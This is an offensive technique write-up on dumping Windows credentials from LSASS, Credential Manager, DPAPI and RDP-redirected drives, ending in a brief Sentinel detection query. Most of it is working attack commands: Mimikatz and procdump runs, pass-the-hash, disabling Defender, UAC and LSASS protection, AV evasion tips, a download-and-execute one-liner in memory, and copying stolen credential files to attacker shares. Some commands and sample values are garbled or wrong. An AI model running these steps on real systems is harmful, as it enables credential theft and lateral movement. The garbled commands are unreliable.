# [CA-DUMP-009]: Mapped drive credential exposure

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CA-DUMP-009 |
| **MITRE ATT&CK v18.1** | [T1003.001 - OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows Endpoint |
| **Severity** | High |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-02 |
| **Affected Versions** | Windows Vista-2025 (Desktop/Server editions) |
| **Patched In** | Unpatched (Mitigation: Disable WDigest, Enable LSASS PPL/Credential Guard) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Sections 6 (Atomic Red Team) not included because no direct Atomic test exists for mapped drive credential extraction (Atomic focuses on process-level techniques like Mimikatz execution rather than file-level credential mapping). All section numbers have been dynamically renumbered based on applicability.

---

## 2. EXECUTIVE SUMMARY

**Concept:** When a user maps a network drive using credentials (e.g., `net use Z: \\server\share /user:DOMAIN\user password`), or connects via RDP with resource redirection enabled, Windows stores the authentication credentials in the Local Security Authority Subsystem Service (LSASS) process memory. These credentials remain in plaintext or reversibly encrypted form in LSASS—and crucially, they are also cached in the Windows Credential Manager vault and registry LSA Secrets. An attacker with local administrator privileges can extract these credentials using tools like Mimikatz, Procdump, or SharpDPAPI, then reuse them for lateral movement across SMB shares, RDP sessions, or other network resources without triggering multi-factor authentication or requiring the original passwords.

**Attack Surface:** The attack targets LSASS process memory (`lsass.exe`), Windows Credential Manager vault (`C:\Users\*\AppData\Local\Microsoft\Credentials\*`), registry LSA Secrets (`HKLM\SECURITY\Policy\Secrets`), RDP session processes (`rdpclip.exe`, `svchost.exe` hosting TermService), and DPAPI master keys stored in `C:\Windows\System32\Microsoft\Protect`. Secondary attack surface includes the `\\tsclient\` UNC path used for RDP device redirection, which attackers can enumerate and access to steal files and clipboard data.

**Business Impact:** **Immediate lateral movement across domain.** Extraction of even a single mapped drive credential (e.g., file server, backup system, or domain-joined database) grants attackers unrestricted access to critical business data, backup systems, or privilege escalation stepping stones. RDP credential theft enables attacker-controlled login to sensitive systems, bypassing accountability logs (credentials are used in the attacker's name, not the victim's). This technique commonly leads to T0 compromise within hours.

**Technical Context:** Credential caching in LSASS is a core Windows feature for seamless single sign-on (SSO); disabling it degrades user experience. Extraction typically completes in seconds once LSASS access is achieved (via local admin). The technique is highly reliable across all Windows versions and is one of the most frequently observed tactics in real-world attacks (ransomware, espionage, lateral movement).

### Operational Risk
- **Execution Risk:** Low (once local admin obtained, Mimikatz execution is trivial). High-risk if LSASS PPL or Credential Guard is enabled; requires kernel exploitation or virtualization escape.
- **Stealth:** Medium. Mimikatz execution generates process creation logs (Event ID 4688) and may be blocked by AV/EDR. However, using native tools (procdump, taskmgr) or LOLBins (rundll32 comsvcs.dll) reduces detection likelihood.
- **Reversibility:** No. Extracted credentials are actionable immediately; revocation requires password changes on all affected accounts and systems.

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.3.7, 5.4.2, 18.2.1 | WDigest configuration, LSASS PPL enablement, security audit logging |
| **DISA STIG** | WN10-GE-000027, WN10-GE-000034, SI-4 | WDigest plaintext, PPL configuration, system monitoring |
| **CISA SCuBA** | Identity.2.1, Endpoint.1.2 | Credential storage protection, endpoint security monitoring |
| **NIST 800-53** | AC-3, CA-7, SI-4 | Access enforcement, continuous monitoring, information system monitoring |
| **GDPR** | Art. 32 | Encryption and pseudonymization of personal data (including admin credentials) |
| **DORA** | Art. 9 | Operational resilience; protection against credential-based attacks |
| **NIS2** | Art. 21 | Cyber risk management; access control and credential protection |
| **ISO 27001** | A.9.2.3, A.9.3.1, A.10.1.1 | Privileged access management, password management, audit logging |
| **ISO 27005** | Section 5.2.3 | Risk assessment of credential storage vulnerabilities |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- Local administrator on target endpoint (for LSASS memory access), **OR**
- SYSTEM account context (for unrestricted DPAPI key extraction and registry LSA Secrets access), **OR**
- SeDebugPrivilege (sufficient for memory dumping with some tools; easier to obtain than full admin)

**Required Access:**
- Network access to compromised Windows endpoint (via SSH, WinRM, RDP with local access), **OR**
- Physical or VM console access to target machine, **OR**
- Code execution on target with escalation to admin/SYSTEM via exploit

**Supported Versions:**
- **Windows:** Vista, 7, 8, 8.1, 10 (all editions: Home, Pro, Enterprise), 11 (all editions), Server 2008-2025
- **Credential Storage:** Consistent across all versions (LSASS standard since Windows 2000)
- **Protections:** Optional (PPL, Credential Guard) in Windows 8.1/Server 2012R2+; default in Windows 11/Server 2022+

**Tools:**
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Latest 2.2.0+, with sekurlsa, vault, dpapi modules)
- [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) (v10.0+, for memory dumping)
- [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) (v1.10+, .NET alternative to Mimikatz)
- [Dumpert](https://github.com/outflanknl/Dumpert) (Direct system calls, API unhooking)
- [SafetyKatz](https://github.com/GhostPack/SafetyKatz) (Combine procdump + Mimikatz reflection)
- [Network Password Recovery](https://www.nirsoft.net/utils/network_password_recovery.html) (Enumerate Credential Manager)
- Rundll32.exe (Native LOLBin for memory dumping via comsvcs.dll)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance - Detect Credential Caching & Mapped Drives

```powershell
# Check for active mapped network drives
Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -match "^\\\\"} | Select-Object Name, Root

# Enumerate Credential Manager stored credentials (vault::cred equivalent in PowerShell)
cmdkey /list

# Check WDigest status (if set to 1, plaintext passwords in LSASS)
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -ErrorAction SilentlyContinue

# Verify LSASS PPL status (Protected Process Light)
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -ErrorAction SilentlyContinue

# Check if Credential Guard is enabled
Get-Itempty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LsaCfgFlags" -ErrorAction SilentlyContinue
# Value: 0 = disabled, 1 = enabled with UEFI, 2 = enabled with hypervisor
```

**What to Look For:**
- Non-empty `cmdkey /list` output indicates cached credentials (high-value targets).
- `UseLogonCredential = 1` indicates WDigest is enabled; plaintext credentials stored in LSASS.
- `RunAsPPL = 0` (or missing) means LSASS is NOT protected; Mimikatz will work reliably.
- `LsaCfgFlags = 0` indicates Credential Guard is disabled; DPAPI keys extractable without virtualization bypass.

**Version Note:** Behavior varies by version. Windows 8.1/2012R2+ removed plaintext passwords by default (unless WDigest enabled). Windows 11 enables PPL + Credential Guard by default; older versions do not.

### Command (Server 2016-2019 - Legacy Defaults):
```powershell
# Check if any plaintext password protections are enabled
$wdigest = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -ErrorAction SilentlyContinue
if ($wdigest.UseLogonCredential -eq 1) {
    Write-Host "WDigest ENABLED - plaintext passwords in LSASS!" -ForegroundColor Red
} else {
    Write-Host "WDigest disabled - no plaintext passwords (unless RDP/legacy SSP enabled)"
}
```

### Command (Server 2022+ - Modern Protections):
```powershell
# Check modern LSASS protections
$ppl = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -ErrorAction SilentlyContinue
$credguard = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LsaCfgFlags" -ErrorAction SilentlyContinue

if ($ppl.RunAsPPL -eq 1) { Write-Host "LSASS PPL: ENABLED" } else { Write-Host "LSASS PPL: DISABLED" }
if ($credguard.LsaCfgFlags -ge 1) { Write-Host "Credential Guard: ENABLED" } else { Write-Host "Credential Guard: DISABLED" }
```

### Bash/Linux CLI Reconnaissance

```bash
# If testing from Linux attacker machine with network access to Windows endpoint
# Check if LSASS dumping tools are present on target (run via WinRM/PsExec)
winrm -c "Get-Command Mimikatz -ErrorAction SilentlyContinue"

# Alternatively, scan for Mimikatz.exe presence
Find-File -Path "C:\*" -Name "Mimikatz.exe" -ErrorAction SilentlyContinue 2>/dev/null

# Check network for accessible SMB shares (may reveal mapped drive servers)
nmap -p 445 --script smb-enum-shares <target_ip>
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Mimikatz LSASS Memory Extraction (Local Admin Required)

**Supported Versions:** Windows Vista-2025 (all editions)

This method uses Mimikatz to extract and decrypt credentials stored in LSASS memory from mapped drives, RDP sessions, and cached logons.

#### Step 1: Gain Local Administrator Privileges

**Objective:** Confirm current user has admin privileges (required for LSASS access)

**Version Note:** Consistent across all Windows versions.

**Command:**
```powershell
# Check if current session is administrator
[System.Security.Principal.WindowsIdentity]::GetCurrent() | Select-Object User

# Get group membership
whoami /groups

# Verify admin status
([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
```

**Expected Output:**
```
User: CONTOSO\admin

BUILTIN\Administrators
Alias    Everyone
...

True  # Admin check passed
```

**What This Means:**
- User belongs to "Administrators" group (or SYSTEM context if running as service).
- Output should show `True` for admin verification; `False` indicates non-admin shell (exploitation needed).

**OpSec & Evasion:**
- Avoid `whoami /groups` in monitored environments; it's less common than admin checks.
- Run from high-integrity PowerShell context (use `Start-Process powershell -Verb RunAs` if needed).
- Disable AV monitoring: `Set-MpPreference -DisableRealtimeMonitoring $true` (requires admin; generates event logs).
- Detection likelihood: **Medium** (group membership queries are routine, but privilege::debug commands are suspicious).

**Troubleshooting:**
- **Error:** "Access Denied" when querying registry
  - **Cause:** User doesn't have admin privileges.
  - **Fix (Server 2016-2019):** Run PowerShell as Administrator via right-click menu.
  - **Fix (Server 2022+):** Disable UAC via `Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0`, reboot.

#### Step 2: Download/Compile & Execute Mimikatz

**Objective:** Obtain and run Mimikatz to access LSASS credentials

**Version Note:** Mimikatz command syntax consistent across LSASS versions; credential format varies (Vista uses NTLM hashes, Windows 8.1+ uses Kerberos tickets + NTLM).

**Command (Download Pre-compiled):**
```powershell
# Download latest Mimikatz release
$url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20230419/mimikatz_trunk.zip"
Invoke-WebRequest -Uri $url -OutFile "C:\Temp\mimikatz.zip"
Expand-Archive "C:\Temp\mimikatz.zip" -DestinationPath "C:\Temp"

# Run Mimikatz privilege::debug + sekurlsa::logonpasswords
& "C:\Temp\mimikatz\x64\mimikatz.exe" "privilege::debug" "sekurlsa::logonpasswords" exit
```

**Expected Output:**
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1234567890
Session           : Interactive
User Name         : CONTOSO\fileserver-admin
Domain            : CONTOSO
Logon Server      : CONTOSO-DC01
Logon Time        : 01/02/2025 10:30:45
SID               : S-1-5-21-...-512

msv :
 [00000003] Primary
  * Username : CONTOSO\fileserver-admin
  * Domain   : CONTOSO
  * NTLM     : 8f5e3c6a1b9d2f4e7a3b5c8d9e1f3a5b
  * SHA1     : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
  
  [00010000] CredentialKeys
  * NTLM     : 8f5e3c6a1b9d2f4e7a3b5c8d9e1f3a5b
  * SHA1     : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6

wdigest :
 * Username : CONTOSO\fileserver-admin
 * Domain   : CONTOSO
 * Password : \\FileServer@2024
```

**What This Means:**
- NTLM hash (8f5e3c6a...) can be used for pass-the-hash attacks (no plaintext required).
- If WDigest enabled, "Password" field shows plaintext credentials (high-value extraction).
- Multiple sessions listed indicate multiple users logged in; all credentials exposed.

**OpSec & Evasion:**
- Mimikatz.exe binary is **highly detected** by antivirus.
- Mitigate by:
  1. Compiling custom version with string obfuscation (replace "mimikatz", "Benjamin Delpy", "gentilkiwi")
  2. Using Invoke-Mimikatz (PowerShell reflective loading; no disk binary)
  3. Running from memory via `C:\Temp\mimikatz.exe` (RAM-resident, not disk)
  4. Using SafetyKatz (procdump + Mimikatz in memory; AVs less effective)
- In-memory execution avoids disk write detection but still triggers LSASS access alerts (Event ID 10).
- Detection likelihood: **High** (if AV/EDR monitors process execution) **Medium** (if using PowerShell reflection).

**Troubleshooting:**
- **Error:** "Privilege '20' OK but command failed"
  - **Cause:** LSASS PPL (Protected Process Light) is enabled.
  - **Fix (Server 2016-2019):** Disable PPL via `Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 0`, reboot.
  - **Fix (Server 2022+):** If PPL + Credential Guard enabled, kernel exploitation needed (rare; fallback to Alternative Method 2).

- **Error:** "No credentials returned"
  - **Cause:** WDigest disabled (standard on Windows 8.1+) and no plaintext passwords in memory.
  - **Fix:** See Alternative Method 3 (Vault Credential Extraction).

#### Step 3: Reuse Extracted Credentials for Lateral Movement

**Objective:** Use harvested NTLM hashes or plaintext passwords to access other systems

**Version Note:** NTLM pass-the-hash works on all versions; plaintext reuse varies by WDigest configuration.

**Command (Pass-the-Hash via Mimikatz sekurlsa::pth):**
```powershell
# Use extracted NTLM hash to impersonate credential holder
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:fileserver-admin /domain:CONTOSO /ntlm:8f5e3c6a1b9d2f4e7a3b5c8d9e1f3a5b /run:cmd.exe

# Now cmd.exe runs with NTLM hash of fileserver-admin
# Access \\backup-server\backups with no password prompt
net use \\backup-server\backups
dir \\backup-server\backups

# Access database server
sqlcmd -S db-server.contoso.com -U fileserver-admin  # No password needed; hash provides auth
```

**Command (Plaintext Password via Runas - if WDigest enabled):**
```powershell
# If extracted password is "\\FileServer@2024"
# Use runas to spawn process with stolen credentials
runas /user:CONTOSO\fileserver-admin /netonly "cmd.exe"
# Prompted for password; enter extracted plaintext: \\FileServer@2024

# Now access domain resources
net use Z: \\fileserver\data /user:CONTOSO\fileserver-admin \\FileServer@2024
# Lateral movement to next target achieved
```

**Expected Output:**
```
The command completed successfully.

Z: \\fileserver\data IS NOW CONNECTED
```

**What This Means:**
- Attacker now has full SMB access to \\fileserver\data as the compromised admin account.
- File shares, backup systems, databases are accessible.
- Lateral movement continues up the privilege chain.

**OpSec & Evasion:**
- Pass-the-hash is less detectable than plaintext password reuse (no new logon events generated on some systems).
- However, unusual SMB connections from non-expected endpoints trigger alerts (network-based detection).
- To evade:
  - Establish reverse shell on file server (runas to spawn Beacon/Empire), then move from there.
  - Use VPN/proxy to mask source IP.
  - Conduct activities during business hours (hide lateral movement in noise).
- Detection likelihood: **Medium-High** (SMB access patterns logged; unusual access from non-standard locations flagged).

---

### METHOD 2: Procdump + Mimikatz (LOLBin Memory Dump, Reduced AV Detection)

**Supported Versions:** Windows Vista-2025

This method uses legitimate Windows/Sysinternals tools (procdump, taskmgr, rundll32) to dump LSASS memory offline, avoiding real-time AV hooks on LSASS process.

#### Step 1: Create LSASS Memory Dump Using Procdump

**Objective:** Dump LSASS process memory to a file for offline credential extraction

**Version Note:** Procdump behavior consistent across all Windows versions.

**Command:**
```powershell
# Download Procdump from Microsoft Sysinternals
$url = "https://download.sysinternals.com/files/Procdump.zip"
Invoke-WebRequest -Uri $url -OutFile "C:\Temp\Procdump.zip"
Expand-Archive "C:\Temp\Procdump.zip" -DestinationPath "C:\Temp"

# Accept license agreement (non-interactive flag)
& "C:\Temp\procdump64.exe" -accepteula

# Dump LSASS to file (full memory dump with -ma flag)
& "C:\Temp\procdump64.exe" -ma lsass.exe "C:\Temp\lsass.dmp"
```

**Expected Output:**
```
ProcDump v11.0 - Process memory dump utility
Copyright (C) 2009-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

[10:45:23] Dump 1 initiated: C:\Temp\lsass.dmp
[10:45:25] Dump 1 complete: 450 MB written in 2.1 seconds
Process dump written to C:\Temp\lsass.dmp
```

**What This Means:**
- LSASS memory snapshot captured (450 MB typical).
- Dump file contains all credentials, Kerberos tickets, hashes in plaintext (if stored that way in memory).
- File can be analyzed locally on attacker machine (offline Mimikatz parsing).

**OpSec & Evasion:**
- Procdump is a **legitimate Sysinternals tool** signed by Microsoft; many AVs whitelist it.
- However, procdump.exe -ma lsass.exe is a **known bad command**; EDR/AV flags specific patterns.
- Mitigate by:
  1. Renaming procdump64.exe to a legitimate name (e.g., sysupdate.exe, servicehost.exe)
  2. Using rundll32.exe comsvcs.dll MiniDump (native LOLBin; harder to detect than procdump)
  3. Using TaskMgr.exe to create dump via GUI (UI interaction less logged than CLI)
- Detection likelihood: **Medium** (procdump flagged on sight; renamed binaries less detectable).

**Troubleshooting:**
- **Error:** "Access Denied" when writing dump file
  - **Cause:** C:\Temp not writable (permissions or UAC).
  - **Fix:** Use `$env:TEMP` instead: `& "C:\Temp\procdump64.exe" -ma lsass.exe "$env:TEMP\lsass.dmp"`

#### Step 2: Transfer Dump to Attacker Machine & Analyze with Mimikatz

**Objective:** Copy LSASS memory dump to attacker-controlled machine and extract credentials offline

**Version Note:** Dump analysis identical across Windows versions.

**Command (Copy via SMB):**
```powershell
# On compromised endpoint
$dumpPath = "C:\Temp\lsass.dmp"
$attacker_share = "\\attacker-machine\share"
Copy-Item $dumpPath "$attacker_share\lsass.dmp"

# On attacker machine (Linux/macOS/Windows)
# Extract credentials from dump using Mimikatz
.\mimikatz.exe "sekurlsa::minidump C:\downloads\lsass.dmp" "sekurlsa::logonpasswords" exit
```

**Alternative Command (via RDP Copy/Paste):**
```powershell
# If RDP clipboard redirection enabled, copy dump via drag-and-drop
# (requires physical proximity or proxied RDP session)
```

**Expected Output:**
```
mimikatz # sekurlsa::minidump C:\downloads\lsass.dmp
Opening 'C:\downloads\lsass.dmp'...
State:  OK

mimikatz # sekurlsa::logonpasswords

# Credentials extracted (identical to live extraction)
Authentication Id : ...
```

**What This Means:**
- All LSASS credentials extracted from memory dump (offline analysis).
- No direct process access needed; only file copy required.
- Timing gap between dump creation and analysis means credentials may not be "live" (if user logged off).

**OpSec & Evasion:**
- Transferring large dump files (450 MB) over network is **detectable** (data exfiltration alerts).
- Mitigate by:
  1. Compressing dump: `Compress-Archive -Path "C:\Temp\lsass.dmp" -DestinationPath "C:\Temp\lsass.zip"` (reduces to ~50MB)
  2. Transferring via encrypted channel (VPN, TLS proxy)
  3. Analyzing on-target with Mimikatz, then only exfiltrating plaintext passwords (not dump file)
- Detection likelihood: **High** (large file transfers flagged as data exfiltration).

---

### METHOD 3: Windows Credential Manager/Vault Extraction (vault::cred)

**Supported Versions:** Windows 7-2025

This method extracts stored network drive credentials from the Windows Credential Manager vault (DPAPI-encrypted but decryptable with local access).

#### Step 1: Enumerate Credential Manager Stored Credentials

**Objective:** List all stored network drive credentials in Windows Credential Manager

**Version Note:** Credential Manager present on Windows 7+; vault schema changed in Windows 8+.

**Command (PowerShell - Native):**
```powershell
# List all stored credentials (requires admin)
cmdkey /list

# Output example:
# Target: Domain Password
# Type: Generic
# User: CONTOSO\backup-admin

# Target: \\backup-server\backup-share
# Type: Domain Password
# User: CONTOSO\backup-admin
```

**Command (PowerShell - Get-StoredCredential):**
```powershell
# If CredentialManager module installed (PowerShell 5.0+)
Get-StoredCredential -Target "\\backup-server\backup-share"

# Output:
# Username: CONTOSO\backup-admin
# Password: BackupAdm!2024Pass
```

**Command (Mimikatz vault::list & vault::cred):**
```powershell
.\mimikatz.exe "vault::list" "vault::cred" exit

# Output:
# TargetName : \\backup-server\backup-share
# UserName : CONTOSO\backup-admin
# Credential : BackupAdm!2024Pass
# Flags : 00000000
```

**Expected Output:**
```
[*] Vault Type: Domain Password
[*] Auth Package: NTLMSSP_OID
[*] Credential Count: 3

Target      | Type     | User
============|==========|==================
Mapped:Z    | Password | CONTOSO\fileadmin
RDP-Server  | Password | CONTOSO\sysadmin
DB-Server   | Password | CONTOSO\dba
```

**What This Means:**
- Three stored credentials identified (file share, RDP, database).
- Each credential is DPAPI-encrypted but decryptable (master key in LSASS).
- Direct plaintext extraction without needing plaintext passwords in LSASS memory (Works even on Windows 8.1+ with WDigest disabled).

**OpSec & Evasion:**
- `cmdkey /list` generates minimal logs (common administrative command).
- Mimikatz vault:: commands are **more suspicious** than cmdkey (specific tool targeting credential vault).
- Detection likelihood: **Low-Medium** (cmdkey is routine; Mimikatz vault is suspicious).

**Troubleshooting:**
- **Error:** "No credentials found"
  - **Cause:** No credentials stored in Credential Manager; users do not save passwords.
  - **Fix:** Prompt users to save credentials (e.g., RDP profile save), or pivot to Alternative Method 1 (LSASS).

- **Error:** "Access Denied" to vault
  - **Cause:** Not running as admin or user whose credentials to extract.
  - **Fix:** Run as admin; vault is per-user (current user's vault only).

#### Step 2: Decrypt DPAPI-Encrypted Vault Credentials

**Objective:** Decrypt vault credentials using DPAPI master key

**Version Note:** DPAPI decryption consistent across versions; master key location varies slightly (Windows 7 vs. 8+).

**Command (Mimikatz dpapi::cred):**
```powershell
# Path to DPAPI-encrypted credential file
$credFile = "C:\Users\CONTOSO.admin\AppData\Local\Microsoft\Credentials\AA10EB8126AA20883E9542812A0F904C"

# Decrypt using Mimikatz DPAPI module
.\mimikatz.exe "dpapi::cred /in:$credFile" exit

# Output:
# credFlags : 00000030
# credSize : 000000fe
# Type : 00000002 - domain_password
# UserName : CONTOSO\fileadmin
# CredentialBlob : FileShare@2024!
```

**Expected Output:**
```
CREDENTIAL
credFlags : 00000030 - 48
credSize : 000000fe - 254
Type : 00000002 - 2 - domain_password
UserName : CONTOSO\fileadmin
CredentialBlob : FileShare@2024!
```

**What This Means:**
- Plaintext credential extracted from DPAPI vault.
- Ready for reuse in pass-the-credential attacks (SMB, RDP, etc.).

**OpSec & Evasion:**
- DPAPI key access is logged (Event ID 4663 - File System Audit).
- Mimikatz dpapi:: commands are **obvious** exploitation attempts.
- Detection likelihood: **Medium-High** (DPAPI vault access is rare and suspicious).

---

### METHOD 4: RDP Credential Theft via Device Redirection (rdpclip.exe, tsclient)

**Supported Versions:** Windows Vista-2025 (RDP with drive redirection enabled)

This method exploits RDP device redirection to steal credentials and files from the client's local drives when mounted on the RDP server.

#### Step 1: Establish RDP Session with Drive Redirection Enabled

**Objective:** Connect to RDP server with local C: drive redirected

**Version Note:** RDP drive redirection available on all Windows versions; tsclient UNC path standard.

**Command (RDP Client Configuration):**
```batch
# Create RDP file with C: drive redirect
echo "[Connection Settings]" > attacker-rds.rdp
echo "full address:s:rdp-server.contoso.com" >> attacker-rds.rdp
echo "username:s:CONTOSO\user" >> attacker-rds.rdp
echo "password:s:P@ssw0rd123" >> attacker-rds.rdp
echo "drivestoredirect:s:*" >> attacker-rds.rdp  # Redirect all drives
echo "redirectclipboard:i:1" >> attacker-rds.rdp  # Enable clipboard

# Connect via RDP
mstsc.exe attacker-rds.rdp
```

**Command (PowerShell - Remote RDP Connection):**
```powershell
# On attacker-controlled RDP server, detect client drive redirections
Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 4 } | Select-Object Name, Size

# Output (if client redirected drives):
# Name  Size
# Z:    1099511627776  # 1TB - client's local drive redirected
# X:    268435456000   # 250GB - another client drive

# Access redirected client drive
dir Z:\  # Browse client's C: drive via Z:
dir X:\Users\
```

**Expected Output:**
```
Directory of Z:\

01/02/2025  10:30 AM    <DIR>          Users
01/02/2025  10:31 AM    <DIR>          Windows
01/02/2025  10:32 AM    <DIR>          Program Files
...
```

**What This Means:**
- Client's local C: drive accessible as Z: on RDP server.
- Attacker can copy files, steal credentials, enumerate data without client knowledge.

**OpSec & Evasion:**
- Drive redirection is **visible to client** (tsclient UNC shown in File Explorer on server).
- However, client may not notice if session is backgrounded or unattended.
- Attacker-side activity (copying files) is **not logged** on client (no endpoint logs of file access).
- To evade:
  1. Copy files silently via PowerShell (no interactive copy dialogs)
  2. Disable clipboard monitoring on server (`Enable-NetAdapterBinding -Name "vEthernet" -ComponentID "ms_netadapterqos" -Enabled $false`)
  3. Time file theft during legitimate file access patterns
- Detection likelihood: **Low** (server-side file access to tsclient is routine for RDP; client unaware).

#### Step 2: Credential Theft from Redirected Drives

**Objective:** Steal saved credentials and private keys from client's redirected local drives

**Version Note:** Credential storage locations consistent across Windows versions.

**Command (Enumerate KeePass, SSH, RDP Credentials):**
```powershell
# Common credential storage locations on Windows
$credFiles = @(
    "Z:\Users\*\AppData\Local\Microsoft\Credentials\*",  # Windows Credential Manager vault
    "Z:\Users\*\AppData\Roaming\KeePass\*",               # KeePass password database
    "Z:\Users\*\.ssh\*",                                   # SSH keys
    "Z:\Users\*\AppData\Local\Microsoft\Vault\*",         # Internet Explorer/Edge vault
    "Z:\Users\*\AppData\Roaming\MobaXterm\*"              # MobaXterm SSH sessions
)

foreach ($pattern in $credFiles) {
    Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue | ForEach-Object {
        Copy-Item -Path $_.FullName -Destination "C:\Temp\stolen\" -Recurse -Force
    }
}

# Exfiltrate stolen credentials
& "C:\Temp\7zip.exe" a -r "C:\Temp\stolen.7z" "C:\Temp\stolen\"
Copy-Item "C:\Temp\stolen.7z" "\\attacker-smb\loot\"
```

**Expected Output:**
```
Directory: C:\Temp\stolen\

Mode                 LastWriteTime         Length Name
----                 ---------------         ------ ----
-a---           1/2/2025 10:45 AM                 KeePassDB.kdbx
-a---           1/2/2025 10:45 AM         2048    id_rsa
-a---           1/2/2025 10:45 AM          567    id_rsa.pub
-a---           1/2/2025 10:45 AM                 AA10EB8126AA20883E9542812A0F904C
```

**What This Means:**
- KeePass database stolen (master password still needed to open, but can be brute-forced offline).
- SSH private keys stolen (direct access to Linux systems if client had SSH agent).
- Windows vault credentials stolen (DPAPI-encrypted; decryptable with Mimikatz if client DPAPI key obtained).

**OpSec & Evasion:**
- Copying large numbers of files to server C: drive is **visible** in Task Manager.
- Mitigate by copying selectively (high-priority credentials only) and cleaning temp files afterward.
- Detection likelihood: **Medium** (RDP server file activity routine, but mass copying of credential files is suspicious).

---

## 7. TOOLS & COMMANDS REFERENCE

### [Mimikatz](https://github.com/gentilkiwi/mimikatz)

**Version:** 2.2.0+ (Latest recommended)
**Minimum Version:** 2.0 (older versions lack vault/DPAPI features)
**Supported Platforms:** Windows Vista-2025, .NET 4.5+ optional

**Version-Specific Notes:**
- Version 2.0-2.1: Basic sekurlsa::logonpasswords, limited vault support
- Version 2.2+: Full vault::cred, dpapi::cred, rdp memory extraction

**Installation:**
```powershell
# Download latest release
$url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20230419/mimikatz_trunk.zip"
Invoke-WebRequest -Uri $url -OutFile "Mimikatz.zip"
Expand-Archive "Mimikatz.zip"

# Run (no installation required; binary only)
.\mimikatz\x64\mimikatz.exe
```

**Usage (Common Commands):**
```powershell
# Extract LSASS credentials
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# Extract Credential Manager vault
.\mimikatz.exe "vault::list" "vault::cred" exit

# Decrypt DPAPI vault files
.\mimikatz.exe "dpapi::cred /in:C:\Users\Admin\AppData\Local\Microsoft\Credentials\GUID" exit

# RDP session credential extraction
.\mimikatz.exe "ts::logonpasswords" exit

# Pass-the-Hash
.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:admin /domain:CONTOSO /ntlm:HASH" exit
```

---

### [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)

**Version:** 11.0+ (Latest)
**Minimum Version:** 9.0
**Supported Platforms:** Windows Vista-2025, x32/x64

**Installation:**
```powershell
$url = "https://download.sysinternals.com/files/Procdump.zip"
Invoke-WebRequest -Uri $url -OutFile "Procdump.zip"
Expand-Archive "Procdump.zip"

# Accept EULA
.\procdump64.exe -accepteula

# Dump LSASS
.\procdump64.exe -ma lsass.exe lsass.dmp
```

---

### Script (One-Liner - Mimikatz in Memory via PowerShell Reflection)

```powershell
# Download and execute Mimikatz entirely in memory (no disk binary)
$url = "https://raw.githubusercontent.com/Empire/Empire/master/empire/server/data/module_source/privesc/Invoke-Mimikatz.ps1"
$script = (Invoke-WebRequest -Uri $url).Content
Invoke-Expression $script
Invoke-Mimikatz -DumpCreds
```

---

## 9. MICROSOFT SENTINEL DETECTION

#### Query 1: LSASS Memory Access via Suspicious Processes

**Rule Configuration:**
- **Required Table:** SecurityEvent, DeviceProcessEvents (Defender for Endpoint)
- **Required Fields:** ProcessName, TargetImage, CallTrace, EventID
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Windows Vista-2025

**KQL Query:**
```kusto
let suspiciousTools = pack_array(
    "mimikatz.exe",
    "procdump.exe",
    "dumpert.exe",
    "safetykatz.exe",
    "sharpdpapi.exe"
);

let lsassTargetProcesses = pack_array(
    "lsass.exe",
    "svchost.exe"  // RDP services
);

DeviceProcessEvents
| where ProcessName in (suspiciousTools)
| summarize count() by ProcessName, DeviceName, InitiatingUserName, Timestamp
| where count() >= 1
| project 
    TimeGenerated = Timestamp,
    Device = DeviceName,
    User = InitiatingUserName,
    Tool = ProcessName,
    Severity = "Critical"
```

**What This Detects:**
- Execution of known credential extraction tools (Mimikatz, Procdump, etc.)
- LSASS-targeted memory operations
- High-risk credential access attempts

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **General Tab:**
   - Name: `LSASS Credential Extraction Attempt`
   - Severity: `Critical`
3. **Set rule logic Tab:**
   - Paste KQL query above
   - Run query every: `5 minutes`
